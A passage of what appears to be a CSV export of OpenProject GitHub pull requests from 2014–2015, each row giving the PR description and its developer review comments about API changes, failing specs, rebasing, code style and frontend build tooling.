After merging this, please merge `release/3.0` into `dev`.","[""I've prepared a stage. <a href='http://hotfix-api-v2-parent-rewiring.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'For reasons<sup>TM</sup> the child array is different depending on whether the rewire_parents flag is set or not.\r\n\r\nWith rewire_parents=0:\r\n![image](https://cloud.githubusercontent.com/assets/617519/4217144/dbfc62d6-38e3-11e4-9678-0fca7e1bfa99.png)\r\n\r\nWith rewire_parents=1 (or not at all):\r\n![image](https://cloud.githubusercontent.com/assets/617519/4217153/f0643c9e-38e3-11e4-8dcc-a9784b1f5a15.png)\r\n\r\nThe impact on the parent_id is ok.\r\n', ""As you uploaded pictures, I can't do an automated diff. I can see that child_ids are returned differently, especially empty child_ids. Is that what you mean?\r\n\r\nDo we want to fix that?"", 'So, the order is also different. Do we make any promises on that?', ""I don't care for the order and I don't think that it makes sense to guarantee that in an hash.\r\n\r\nI would definitely want to you to take a look at the child_id weirdness. Maybe the difference is legit but it   looks strange."", ""child_ids are only filled during the rewiring process, and thus are null when skipping the rewiring.\r\n\r\n@NobodysNightmare @jpassing Are you ok with not having the child_ids when disabling rewiring?\r\n\r\nIf you're ok with not having them, would null be an ok response or should the API rather return an empty list? I'd say having both null and an empty list makes it more clear that in one case the values are not provided and in the other case there are no children. No idea on how easy parsing that with C# is, though."", 'Seems inconsistent to me.\r\n\r\nWe do not use child_ids though -- so for the TPR, it does not really matter.']"
360,opf/openproject,1874.0,[``* `#15352` fix personal activity broken``](http://www.openproject.org/work_packages/15352),"[""I've prepared a stage. <a href='http://0xf013-feature-15352-personal-activity-broken.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'Why for dev not stable?', '@marutosi the ticket is marked as for dev. ', 'I mean that why **bug fix** is for dev not to stable?', '@0xF013 please see https://www.openproject.org/work_packages/15352 for additional feedback.', ""@ulferts can I somehow trigger the build again? it doesn't say why it fails"", '@0xF013 We did some test with Shippable which leads to the failing tests here. @linki took a look at the corresponding travis run (https://travis-ci.org/opf/openproject/builds/34682285) and it is looking all good. Might be a good chance to add that grouping :smile: ', '@ulferts grouping is working locally, just not yet test-covered:)', ':+1: thanks for doing the grouping fix.']"
361,opf/openproject,1889.0,https://www.openproject.org/work_packages/15613,"[""I've prepared a stage. <a href='http://fix-uppercase-wp-on-wp-show.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ':+1: ']"
362,opf/openproject,1885.0,"https://www.openproject.org/work_packages/15077

First commit is just code cleanup and removing an accept_key_auth statement to a non existing action (show). Second commit removes an unnecessary visibility scoping (please see https://github.com/opf/openproject/commit/331fab456e33426e7e0d5e085a2144dde9a5342a for reasons).","[""I've prepared a stage. <a href='http://fix-api-v2-shared-versions-with-id.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'Besides the two style issues, this looks good :+1: ', '@meeee I fixed what you mentioned and rebased.', ':+1: ']"
363,opf/openproject,1901.0,WP [#14787](https://www.openproject.org/work_packages/14787),"[""I've prepared a stage. <a href='http://fix-menu-item-title-validation.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'Mh, the specs are green locally but one of them still fails on Travis. Looking into it later today.', '@machisuji the menu items containing characters like ""."", ""/"" are not marked as selected like the rest of the menu items', 'I\'ll look into it.\r\n\r\n-----Original Message-----\r\nFrom: ""ulferts"" <notifications@github.com>\r\nSent: \xe2\x80\x8e17/\xe2\x80\x8e09/\xe2\x80\x8e2014 10:24\r\nTo: ""opf/openproject"" <openproject@noreply.github.com>\r\nCc: ""Markus Kahl"" <machisuji@googlemail.com>\r\nSubject: Re: [openproject] Fix/menu item title validation (#1901)\r\n\r\n@machisuji the menu items containing characters like ""."", ""/"" are not marked as selected like the rest of the menu items\r\n\xe2\x80\x94\r\nReply to this email directly or view it on GitHub.=', ""looking good now, don't know what I did....""]"
364,opf/openproject,1902.0,https://www.openproject.org/work_packages/15710,"[""I've prepared a stage. <a href='http://fix-experimental-api-missing-authorizations.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'The PR title looks important, which problem does this PR exactly fix?\r\n\r\nThree specs are failing.', 'Added a WP for that just now:\r\nhttps://www.openproject.org/work_packages/15710', 'Looks pretty good overall. Added a few comments, but these are probably small things.', ':+1: \r\n\r\nFeel free to merge yourself if Travis agrees.']"
365,opf/openproject,1877.0,"[``* `#15406` modal in menu setting cannot be closed by pressing ESC``](http://www.openproject.org/work_packages/15406)

[``* `#15407` focus lost after closing modal in menu settings``](http://www.openproject.org/work_packages/15407)

I changed a bower.json dependency to my own repository so a bower clean cache and a bower install might be needed","[""I've prepared a stage. <a href='http://0xf013-feature-15406-modal-in-menu-settings-cannot-be-closed-by.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@0xF013 just a pointer that specs are failing.', ""@ulferts it's weird, I just ran the spec with the same seed locally and it's green. Also it fails only on one specific config \r\nhttps://www.dropbox.com/s/u5mrbs2jkfnsclb/%D0%A1%D0%BA%D1%80%D0%B8%D0%BD%D1%88%D0%BE%D1%82%202014-09-09%2016.13.43.png?dl=0\r\nDo you happend to know who can I ask about this test suite param?"", '@0xF013 the configurations are splitting up the different kinds of tests we unfortunately still have: specs, cukes, test-unit.\r\nFrom what I see, the same spec fails on postgres and mysql. So it is a spec that is failing and because it does so on both dbs it is not a flickering test and thus something you will need to fix.', '@0xF013 The failing tests on travis probably have to do with a bug we noticed on the work packages page. There is no vertical scrolling defined on the page. So when a small viewport is selected, the settings button is no longer in an accessible area.\r\n\r\nSo I guess it makes sense to halt working on this until the bug is fixed and see if fixing the bug will also fix those here.  ', '@0xF013 can you please rebase your branch to the current HEAD of dev where the scrolling feature has been added. In https://github.com/opf/openproject/pull/1917 I tested doing that and the test failures did no longer occur. ', '@ulferts will do it do today']"
366,opf/openproject,1920.0,"Controllers where removed in https://github.com/opf/openproject/commit/f91256fef9b9ccd40219901454c13bec9f0776c6 as they where deemed to no longer be in use. A mistake...

* https://www.openproject.org/work_packages/15892","[""I've prepared a stage. <a href='http://fix-readd-deleted-experimental-controllers.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
367,opf/openproject,1930.0,[``* `#15604 ` fix saved queries don't update wp lists correctly when removing filters``](http://www.openproject.org/work_packages/15604),"[""I've prepared a stage. <a href='http://0xf013-feature-15604-saved-queries-dont-update-wp-lists-when-re.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
368,opf/openproject,1952.0,[``* `#10846` Unclear error message when copying project``](https://www.openproject.org/work_packages/10846),"[""I've prepared a stage. <a href='http://netfighter-feature-10846-unclear-error-message-when-copying-pro.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
369,opf/openproject,1965.0,https://www.openproject.org/work_packages/16343,"[""I've prepared a stage. <a href='http://fix-permissions-on-v2-types-controller.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
370,opf/openproject,1955.0,[``* `#15274` fix details pane version link leads to 403 when no permissions on parent project``](http://www.openproject.org/work_packages/15274),"[""I've prepared a stage. <a href='http://0xf013-feature-15274-details-pane-link-to-version-leads-to-403-.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@0xF013 sorry for the late answer. After having taken a look at the code I would rather use the link alternative as it is more consistent with what we have and does not treat the available actions as an attribute of the version.']"
371,opf/openproject,1960.0,"[``* `#11254` Copy project: Always error message ""subproject of invalid""``](https://www.openproject.org/work_packages/11254)","[""I've prepared a stage. <a href='http://netfighter-feature-11254-error-subproject-of-invalid.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'Thanks for the changes @netfighter.\r\n\r\nWith the changes made it would be way easier to write the tests:\r\n1) Unit spec for Project#copy_allowed?\r\n2) View spec for project/settings/_action_menu\r\n\r\nThe controller spec is way to complicated for this now.', '@netfighter, specs fail.', 'PR updated']"
372,opf/openproject,2037.0,[``* `#13608` Wrong hover color in query selection dropdown for certain themes``](https://community.openproject.org/work_packages/13608),"[""I've prepared a stage. <a href='http://fix-13608-wrong-hover-color-in-query-select-dropdown-for-certai.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", 'I just checked with Safari and Firefox (with emptying the cache), now the highlighting color is too similar to the font color, so the text is barely readable.\r\n\r\nAny uncommitted change you forgot?', 'Works now  :+1: \r\nThanks!']"
373,opf/openproject,2082.0,This PR introduces a rake task for backing up the database. It is aware of what kind of db is used and uses the appropriate command line tools available (dbms specific). Right now it supports postgresql and mysql. ,"[""I've prepared a stage. <a href='http://feature-backup-task-3-0.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ""Ignore @houndci on this matter. We don't have a houndci config on the release/3.0 branch."", 'This is a hotfix (or is it backport already?) and thus should be named hotfix/backup_task_3-0 and have the coresponding label.']"
374,opf/openproject,2100.0,https://community.openproject.org/work_packages/17065,"[""I've prepared a stage. <a href='http://fix-sql-in-experimental-api.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
375,opf/openproject,2136.0,Includes some small adjustments to Hound/Rubocop config.,"[""I've prepared a stage. <a href='http://feature-consistent-ruby-style.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@opf/developers should we be more liberal about long lines? or make it a goal to fix these manually as we refactor?', '@myabc I my opinion we should not be liberal about long lines . I think especially in ruby long lines of code are often a result of a long method chains including blocks. Such code is very hard to read and should be refactored anyhow. So I see the possibility to get better code by being not so liberal about long lines. So the question is how many characters we define as long?', 'Looks good to me except for some minor whitespace issues like double spaces here and there.\r\n\r\nAs for line length: I think 80 is too short. But 100 (or 99) would be fine.', '@kgalli Ok. I agree with you. In order to get this PR merged ASAP though, I\r\nthink we should keep reformatting long lines for another PR (or try to do\r\nit bit by bit).\r\n\r\nOn Tue, Nov 4, 2014 at 1:05 PM, Markus Kahl <notifications@github.com>\r\nwrote:\r\n\r\n> Looks good to me except for some minor whitespace issues like double\r\n> spaces here and there.\r\n>\r\n> As for line length: I think 80 is too short. But 100 (or 99) would be fine.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/opf/openproject/pull/2136#issuecomment-61630198>.\r\n>', '@myabc right! We should merge this one and open a new one for reformatting long lines.', 'I strongly agree that 80 is too short for today. For C# we went for 120\ncharacters, but maybe Ruby is much more condensed so that you do not\nneed so loose limits ^^\n\nDid someone try to analyze how long lines actually are? How many violate\n60, 80, 100, 120, 150 characters?\n\nP.S.: Am I the only one that is unable to open the PR in the web\nbrowser? I always receive a **Unicorn!**, because the page is taking\n""way too long to load"".\n\nAm 04.11.2014 13:05, schrieb Markus Kahl:\n>\n> Looks good to me except for some minor whitespace issues like double\n> spaces here and there.\n>\n> As for line length: I think 80 is too short. But 100 (or 99) would be\n> fine.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/opf/openproject/pull/2136#issuecomment-61630198>.\n>\n\n\n-- \nM. Sc. Jan Sandbrink\nFinn GmbH\nj.sandbrink@finn.de\nRosenthaler Str. 32\n10178 Berlin\nTelefon: +49 30 288 777 07\nwww.finn.de\nSitz Finn GmbH: Berlin, Amtsgericht Berlin-Charlottenburg, HRB 117935\nGesch\xc3\xa4ftsf\xc3\xbchrer: Niels Lindenthal\nUStID: DE 211309779', ""@NobodysNightmare It's too big for github to handle. I can see the conversation but not the files. Ruby is not quite as verbose as C#, so 120 isn't necessary. But it is more verbose than other languages for which 80 characters would be acceptable (cf. Haskell)."", 'So I think 100 would be a good compromise.', '> Did someone try to analyze how long lines actually are? How many violate 60, 80, 100, 120, 150 characters?\r\n\r\nNo. We probably could/should.\r\n\r\n80 is short, but it is standard for many [Ruby open-source projects](https://github.com/bbatsov/ruby-style-guide#80-character-limits). Many developers work in split panes, so that might also be one other reason for its continued popularity.', '@NobodysNightmare \r\n\r\n> I always receive a **Unicorn!**, because the page is taking ""way too long to load"".\r\n\r\nFor me it\'s only sporadic :stuck_out_tongue: ', ""Are those devs working with 800x600 CRT monitors? Because I'm working with split views too and there's even room for 120 characters*. ;P"", 'IMHO 80 chars only works when your variables are called `f`, `i` and `s`.\r\n\r\nFor ruby I see problems with specs:\r\n`it: ""is a natural sentence that does not care about concise ruby-language""`, I don\'t know if there are\r\nother comparable cases.', '> Did someone try to analyze how long lines actually are? How many violate 60, 80, 100, 120, 150 characters?\r\n\r\nEven allowing lines with 99 chars we have a large number of violations:\r\n\r\nin `app`:\r\n```\r\n710   Metrics/LineLength\r\n369   Metrics/AbcSize\r\n95    Metrics/PerceivedComplexity\r\n```\r\n\r\nin `lib`:\r\n```\r\n413   Metrics/LineLength\r\n329   Style/SpaceInsideParens\r\n130   Style/IndentationWidth\r\n```\r\n\r\n']"
376,opf/openproject,2144.0,[``* `#16973` API V3 render textile endpoint``](https://community.openproject.org/work_packages/16973),"[""I've prepared a stage. <a href='http://feature-16973-textile-endpoint.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ':+1: ']"
377,opf/openproject,2103.0,[``* `#16983` Extend API V3's work package PATCH endpoint for description``](https://community.openproject.org/work_packages/16983),"[""I've prepared a stage. <a href='http://feature-16983-api-extend-wp-patch-for-description.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
378,opf/openproject,2106.0,[``* `#16988` editable description``](http://community.openproject.org/work_packages/16988),"[""I've prepared a stage. <a href='http://0xf013-feature-16988-editable-description.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@0xF013 I am sorry, but this needs rebasing/merging.', '@ulferts This is what I am wrapping up at the moment (plus adding a protractor test for 409 response)', '@ulferts @hschink rebased and enhanced', '@0xF013 Please have a look again at your rebase.', '@hschink rebasing against the subject branch was a bad idea. I think I fixed it now\xd1\x8e\r\nI guess I need to add the preview']"
379,opf/openproject,2192.0,Minor enhancements that didn't make it into the the original PR (#1992) / original  commit (66f796c00705f5f7eeaba46626a6c5e8d4e99a7e).,"[""I've prepared a stage. <a href='http://feature-webpack-bundling-enhancements.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
380,opf/openproject,2201.0,"Follows on from #2183. However, this PR is against **dev** as I did not deem buggy test codes to warrant a hotfix.","[""I've prepared a stage. <a href='http://fix-remove-js-globals-in-karma-tests.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
381,opf/openproject,2197.0,[``* `#17331` links in description trigger edit mode``](http://community.openproject.org/work_packages/17331),"[""I've prepared a stage. <a href='http://0xf013-feature-17331-links-in-description-trigger-edit-mode.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
382,opf/openproject,2231.0,[``* `#17403` Implement collection specification``](https://community.openproject.org/work_packages/17403),"[""I've prepared a stage. <a href='http://fix-17403-implement-collection-specification.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ""@ulferts @myabc I ran the protractor test locally and it doesn't fail there. So, I consider this _ready for review_. :smiley: "", ""* There is no pagination for now. While this is fine from an implementation process perspective (we can work on that when we come back for the users), this is a limitation, we have to agree to accept this as the scope of the PR.\r\n* ```/api/v3/work_packages/:id/available_watchers``` does not work -> not adapted\r\nThe specification notes the offset, ... parameters, which the endpoint does not support. I guess we should update the specification as this endpoint is debatable at least in it's current position. @NobodysNightmare \r\n* ```/api/v3/work_packages/:id/available_statuses``` contains link to work_package. I don't find that particularly bad but it is not according to the specification."", 'Nice cleanup job @hschink ', '@ulferts \r\nregarding `/api/v3/work_packages/:id/available_watchers`: This should be moved to the project level, right?\r\n\r\nregarding `/api/v3/work_packages/:id/available_statuses`: This should not exist at all, right? I found at least one reference in the API-Spec, which I would like to remove...\r\nAt least my memory on that topic was, that this endpoint is not neccessary, because we include the statuses inline in the form instead of providing a separate endpoint.', '@NobodysNightmare \r\n\r\n> regarding /api/v3/work_packages/:id/available_watchers: This should be moved to the project level, right?\r\n\r\nI think we wanted to nest this under a work package for the sake of consistency, even though our data model, for the time-being at least, actually associates available watchers with a project.', '@myabc which consistency do you mean? All other **available_foo** were moved to the project-level too. The rationale was something like:\r\n\r\n- If it would ever change, we would also update the link to that resource\r\n- It allows for better caching\r\n\r\nHowever I remember, that we at least had to change the result of `available_watchers` slightly. Currently it excludes the currently selected watchers, which is inconsistent to other endpoints returning allowed values. Usually the selected value should be *available* and as such part of the result.']"
383,opf/openproject,2193.0,"This PR concerns itself with two related, but separate themes:

### Support plugins extending Webpack build pipeline
https://community.openproject.org/work_packages/5697
https://community.openproject.org/work_packages/17241

#### Notes for review:

* Webpack will not bundle plugins (and fail silently) if a `Gemfile.lock` is inconsistent (for example, if there are conflict makers). I'm not how/if we should make this more obvious.

* Shelling out from node to Ruby is currently done **synchronously**, which is not really _the node way_, but I wasn't really sure how to handle callbacks in the webpack config.

###  Build translations from openproject-translations, if available
https://community.openproject.org/work_packages/14679

#### Notes for review:

* ~~You can specify an `OPENPROJECT_TRANSLATIONS_ROOT` if you want to
  test this PR without adding openproject-translations as a dependency.~~

  _Removed in 4ea7cb0. Use a bundle override instead (e.g. `bundle config local.openproject-translations ~/git-repos/openproject-translations`_

---

See also 
* finnlabs/openproject-backlogs#114
* finnlabs/openproject-costs#115","[""I've prepared a stage. <a href='http://feature-webpack-i18n-support.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@ulferts @tessi How do we support translations for plugins that are neither German or English?\r\n\r\n                              | core app  | plugins |\r\n------------------------------|-----------|---------|\r\nbundled translations          |           |         |\r\n                          en  | X         | X       |\r\n                          de  | X         | X       |\r\nopenproject-translations      |           |         |\r\n                          it  | X         | ?       |\r\n                          es  | X         | ?       |\r\n                          cn  | X         | ?       |\r\n                         etc. | X         | ?       |\r\n', ""@myabc don't know that, sorry."", 'Hound will continue to bark until #2184 is merged ... hint, hint... :poodle: ', '@myabc @ulferts I had a little chat with @kgalli about including plugin translations yesterday. He suggested to split the translation files from the plugin-code (and host the translations on some separate opf-related service). This would enable us to have many crowdin projects (and other translation services would probably work too), so that we can have one crowdin-project per plugin.\r\n\r\nThe translations-plugin could then fetch the translations of the current OpenProject version from that opf-service (which in turn asks crowdin) for the core and all plugins. In a second step, those translations could be combined into one `<locale>.yml` file.\r\n\r\nYou can probably ask @kgalli for details.', ""I've added notes to the description.\r\n\r\nThere are some additional, related tasks that I'll leave for other Pull Requests:\r\n\r\n * bundling HTML templates along with plugin JS assets.\r\n * moving Karma and Protractor tests under `frontend`\r\n "", ""Additional, related tasks for translations that I'll leave for other Pull Requests:\r\n\r\n* use  CrowdIn for German, English core translations.\r\n* setting up CrowdIn projects for individual plugins."", 'looks good to me and works on my machine.', 'Looks ok to me', '@ulferts issues you mentioned should be dealt with.', 'Merging because I know that the failing cukes have nothing to do with this PR.']"
384,opf/openproject,2262.0,"This change is intended to:
* clean up the code by removing the necessity to check wether the value is provided by the backend.
* increase robustness by having a default to fall back.","[""I've prepared a stage. <a href='http://fix-configuration-service-robustness.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@myabc thanks for the pointers. That really helped in shortening the method.', '@ulferts I believe `/* jshint camelcase: false */` will quieten JSHint camel case warnings.', '@myabc right again. Thanks.', ':+1: looks good! will merge when Travis is through.']"
385,opf/openproject,2263.0,"Templates, project infrastructure, configuration.

See 6ec5ca58, #2261.

Also handles:
https://community.openproject.org/work_packages/17538

Continuation of code reorganisation started in #2193. This PR will another step towards allowing us  to move the frontend app into a separate repo.","[""I've prepared a stage. <a href='http://feature-frontend-reorganisation-complete.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@myabc I think it happens in me 1.3 branch as well', '@0xF013 I also added template caching in this branch (albeit with Webpack rather than gulp: see commit 6f17d51f). I guess the Protractor failure might be related to this (i.e. many fewer HTTP requests being made).', 'Also deals with:\r\nhttps://community.openproject.org/work_packages/17538\r\n']"
386,opf/openproject,2219.0,"[``* `#17013` status editable``](http://community.openproject.org/work_packages/17013)
","[""I've prepared a stage. <a href='http://0xf013-feature-17013-status-editable.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '> Please mark is as work in progress\r\n\r\nDone. ', '@myabc rebased', 'Just for the record: After a ``PATCH`` request to the work package endpoint the work package form is not updated and, thus, also the possible statuses are not updated.', '@hschink it was updated, just not in the right place. amended']"
387,opf/openproject,2275.0,"Implements the following tickets (the commits also reflect this order):

1. https://community.openproject.org/work_packages/17580
2. https://community.openproject.org/work_packages/17439
3. https://community.openproject.org/work_packages/17440","[""I've prepared a stage. <a href='http://fix-17580-500-when-posting-to-textile-with-json.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
388,opf/openproject,2282.0,"https://community.openproject.org/work_packages/16972
https://community.openproject.org/work_packages/17320
https://community.openproject.org/work_packages/17582","[""I've prepared a stage. <a href='http://fix-16972-localize-api-v3.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ""I've prepared a stage. <a href='http://fix-16972-localize-api-v3.opf-openproject-5eefc6be83fa70526458.ttrcloud.com' target='_blank'>Click to open.</a>"", 'I like it that the ```Accept-Language``` header is used.']"
389,opf/openproject,2317.0,https://community.openproject.org/work_packages/17665,"[""I've prepared a stage. <a href='http://fix-17665-unassigned-version-has-no-empty-value.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", ':+1: ']"
390,opf/openproject,2331.0,"WP [#17654](https://community.openproject.org/work_packages/17654)

Requires merging of #2325","['Still need to fix one spec (401 for unauthenticated users).', '@machisuji, please check out what has been happening over at #2325 and tell us there if you agree.', ""I shall squash this once it's green."", ""> I shall squash this once it's green.\r\n\r\nWith that attitude you will never become king of the commit count...\r\n\r\nHowever, nice to see 5 pending builds of travis ^^"", 'PPPpenta Build', ""@ulferts @linki It's green!"", ':+1: ']"
391,opf/openproject,2357.0,[``* `#6462 ` fix display filter operator when adding filter``](http://community.openproject.org/work_packages/6462),"[""I've prepared a stage. <a href='http://0xf013-feature-6462-display-filter-operator-when-adding-filter.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>"", '@houndci such is life']"
392,opf/openproject,2446.0,"Because #2115 was in a more mergeable condition at the time, I skipped converting test-unit test syntax in original PR #2136. 

#2115 has since diverged and it would be probably be easier to repeat the migration steps based on a fresh branch.","[""I've prepared a stage to preview changes. <a href='http://feature-consistent-ruby-style-test-unit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://feature-consistent-ruby-style-test-unit.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@myabc If you would fix the remaining hound issues I would happily merge all 3,5k lines of your PR ;-)', ""@NobodysNightmare Fixing line lengths to conform will require a fair amount of manual work. It's probably better if we do this as we do along instead."", 'Merging... the failures should be known *Umfaller* tests...']"
393,opf/openproject,2489.0,,"[""I've prepared a stage to preview changes. <a href='http://0xf013-add-busy-loaders.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://0xf013-add-busy-loaders.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", ""This is definitely better. The behaviour I'd like to see though is that the detail pane opens immediately, and that a loading indicator is shown within the detail pane itself.\r\n\r\n@ulferts should we go ahead and merge now?"", ""@myabc I think we'd need an intermediate state for that. As of now there is some feedback for the user.""]"
394,opf/openproject,2461.0,"## OpenProject work packages

* https://community.openproject.org/work_packages/17417
* https://community.openproject.org/work_packages/17418","[""I've prepared a stage to preview changes. <a href='http://feature-writeable-start-and-end.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://feature-writeable-start-and-end.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'Aside from my two remarks, this is looking good to merge.', '@ulferts Only a decision on good error messages left I guess...', 'That looks like two false negative tests to me :(', '@NobodysNightmare just reminder of what we talked about: We could decrease the dependency if you where to include the DateTimeFormatter in API::Decorators::Single and there wrap it in a method.\r\n\r\n@0xF013 in the PR @NobodysNightmare changed the estimatedTime property so that it returns null if the value is not set. This currently breaks the front end. So if estimatedTime is null, it should be counted as not set (""-"" displayed) if it is 0 it should be counted as such (""0"" displayed).  ', '@ulferts should I take over this branch?', '@0xF013 yes, please add to it. I think the changes @NobodysNightmare will make are minor and should not impede the front end work. ', '@0xF013 You can have it... either wait until my next batch of commits arrives or just start. In the latter case, the one of us that takes longer to develop will have to rebase. I think we should not be conflicting eachother.\r\n\r\nedit: I did not see the comment of @ulferts until sending my comment -.- Whatever, I jsut said the same ^^']"
395,opf/openproject,2550.0,"## OpenProject work packages

* https://community.openproject.org/work_packages/18296
* https://community.openproject.org/work_packages/18295
* https://community.openproject.org/work_packages/18294
* https://community.openproject.org/work_packages/18293
* https://community.openproject.org/work_packages/18292
* https://community.openproject.org/work_packages/18291
* https://community.openproject.org/work_packages/18290
* https://community.openproject.org/work_packages/18288


## Progress

* [x] schema for basic custom fields
* [x] schema for linked custom fields
* [x] schema for list custom fields
* [x] basic custom fields in WP representer
* [x] linked custom fields in WP representer
* [x] list custom fields in WP representer
* [x] patchable basic custom fields
* [x] patchable linked custom fields
* [x] patchable list custom fields
* [x] render text custom fields as formattables (forced to `plain`)
* [x] full specs for `CustomFieldInjector`
* [x] don't override `new`, but make a class creator that is usable by lambdas passed to `:decorator`
* [x] clean up messy bits and pieces >:D
* [x] validation of allowed values

## Progress during review

- [x] embed custom values of type user and version
- [x] find the root cause of unspecific custom value errors (they are more specific normally)
- [x] rename `wp_schema` of `inject_schema` (and probably adapt behaviour) to make method work for other customizables
- [x] specs for `ResourceLinkParser#parse_id`'s `property` parameter
- [x] check user deletion
- [x] avoid deep nesting in acts as custom...
- [x] fix test with journal stuff
- [x] falsey
- [x] method missing awesomeness
- [x] adapt **frontend** to missing `customProperties` dictionary on `/api/v3/work_packages/:id`
- [x] adapt StringObject","[""I've prepared a stage to preview changes. <a href='http://feature-api-custom-fields-in-schema.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://feature-api-custom-fields-in-schema.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", '@ulferts wrote:\r\n> @NobodysNightmare can you please check whether the user deletion rewires custom fields of format user correctly?\r\n\r\nThis diff got outdated, but was not yet fixed', 'As far as I have seen, there are no tests that guarantee, that the custom values are made part of the work package representation. Is that correct @NobodysNightmare?', 'Two remarks regarding functionality:\r\n1) Custom values for fields of type ""User"" and ""Version"" are not embedded. That is inconsistent to the rest of the linked properties.\r\n2) If a custom field is erroneous, the error message returned is: ""Custom fields is invalid"". This is not very helpful as it will not allow a client to know which field caused the error especially if he modifies more than one CustomValue.   ', '@ulferts I added empty checkboxes for things I did not already fix and I agree with you that I want to fix them ;-)', 'ping me when I should update the frontend', ""@0xF013 Feel free to adapt the frontend, if there are any questions don't ~~bother~~ hesitate asking.\r\n\r\nI've prepared a checkbox in the description for you. Feel free to check it whenever you like\r\n\r\nedit: please **bother** asking! don't **hesitate**! ***WORDS***!"", ""@NobodysNightmare \r\n> don't bother asking"", '~~I possibly found an error related to this branch and need to investigate:\r\nSeems that I am unable to change the type of a work package if that would remove a custom field of type user.~~\r\n\r\nI am not able to reproduce it, so it never happened...', 'Trying to review on the JS-side of life...', ""@NobodysNightmare I stayed with the raw instead of html for now since I'd have to do some magic around rendering it. Is it important that it's rendered as HTML now?\r\n\r\n"", ""Not too important... as it is no textile we are losing nothing like **bold** or *italic*.\r\n\r\nHowever, we will be losing line breaks for now. So you should at least keep that in mind (or in a ticket).\r\n\r\nedit: or in a TODO-comment, I don't know"", '@NobodysNightmare it will be fixed automatically when the fields will become editable', '@0xF013: The karma tests failed three times in a row. This does not seem to be good, probably they are really failing.\r\n\r\nThis could be related to the fact that I am unable to open the details pane on teatro.', ""@NobodysNightmare bummer, it's green locally""]"
396,opf/openproject,2681.0,"This will fix some minor issues with the work package views.

These fixes will act as a band aid until the new work packages views are finished and will therefore not be in use for long.

Meets https://community.openproject.org/work_packages/19073","[""I've prepared a stage to preview changes. <a href='http://floriank-fix-19073-workpackage-quick-wins.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Open stage</a> or <a href='http://floriank-fix-19073-workpackage-quick-wins.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com/teatro.log' target='_blank'>view logs</a>."", 'I am no entirely sure about what @houndci complains here', '![nqxm8pr](https://cloud.githubusercontent.com/assets/498241/6594902/5d38fef0-c7e5-11e4-8e78-85f4c458dd0c.jpg)\r\n']"
